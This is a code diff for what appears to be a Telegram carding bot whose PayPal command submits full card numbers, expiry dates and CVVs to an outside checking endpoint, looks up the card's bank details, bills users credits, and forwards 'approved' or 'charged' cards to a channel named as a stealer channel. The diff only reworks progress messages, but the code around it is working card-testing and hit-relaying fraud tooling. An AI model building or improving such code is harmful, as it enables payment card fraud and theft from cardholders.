@@ -10,6 +10,7 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 
 # Updated Stealer Channel ID
 STEALER_CHANNEL_ID = -1003627495953
+COOKING_GIF = "https://raw.githubusercontent.com/manus-ai/assets/main/egg_cooking.gif"
 
 async def send_hit_if_approved(client: Client, text: str):
     try:
@@ -41,12 +42,8 @@ async def paypal_cmd(Client, message):
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         endpoint_url = f"https://onyxenvbot.up.railway.app/paypal/key=yashikaaa/cc={fullcc}"
 
-        firstresp = f"\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"
-        msg = await message.reply_text(firstresp, quote=True)
-
-        secondresp = f"\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"
-        await asyncio.sleep(0.5)
-        await msg.edit_text(secondresp)
+        # 1. Send Cooking GIF (No Caption)
+        gif_msg = await message.reply_animation(COOKING_GIF, quote=True)
 
         start = time.perf_counter()
         
@@ -55,7 +52,7 @@ async def paypal_cmd(Client, message):
         status = "Error"
         response = "Request failed"
         
-        async with httpx.AsyncClient(timeout=45, follow_redirects=True, limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)) as session:
+        async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
             for attempt in range(max_retries):
                 try:
                     response_obj = await session.get(endpoint_url)
@@ -70,7 +67,6 @@ async def paypal_cmd(Client, message):
                     else:
                         status = api_status.upper()
                     
-                    # If we got a real response, break the retry loop
                     break
                     
                 except (httpx.RequestError, ValueError) as e:
@@ -78,30 +74,32 @@ async def paypal_cmd(Client, message):
                         status = "Error"
                         response = f"Request failed: {e}"
                     else:
-                        await asyncio.sleep(1) # Wait a bit before retry
+                        await asyncio.sleep(1)
                         continue
 
         getbin = await get_bin_details(cc)
-
-        thirdresp = f"\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"
-        await asyncio.sleep(0.5)
-        await msg.edit_text(thirdresp)
-
         brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
         
         end = time.perf_counter()
         elapsed_time = round(end - start, 2)
 
-        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\\n\\n━━━〔 META 〕━━━\\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \\n\\n━━━〔 OWNER 〕━━━\\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\\n\"\"\"
+        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"
 
-        await asyncio.sleep(0.5)
-        await msg.edit_text(finalresp)
+        # 2. Delete Cooking GIF and Show Final Result immediately
+        try:
+            await gif_msg.delete()
+        except:
+            pass
+            
+        await message.reply_text(finalresp, quote=True)
 
         await setantispamtime(user_id)
         await deductcredit(user_id)
 
         if "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status or "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
             await sendcc(finalresp, session)
+
+        await session.aclose()
 
     except Exception:
         import traceback
